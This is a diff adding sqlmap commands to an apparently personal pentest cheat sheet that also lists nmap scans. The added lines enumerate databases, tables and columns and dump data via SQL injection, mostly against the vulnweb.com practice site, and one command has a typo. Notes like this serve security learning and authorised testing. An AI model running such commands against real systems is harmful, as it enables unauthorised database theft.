@@ -44,3 +44,10 @@ nmap -oX output.xml domain.com
 
 Agressive
 nmap -A -T4 domain.com
+
+SQLMAP
+
+python3  sqlmap.py -u https://domain.hu/kosar_rak.php?id=1 --dbs
+python3 sqlmap.py  -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables
+python3 sqlmap.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists --columns
+pyton3 sqlmap.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists -C aname --dump 
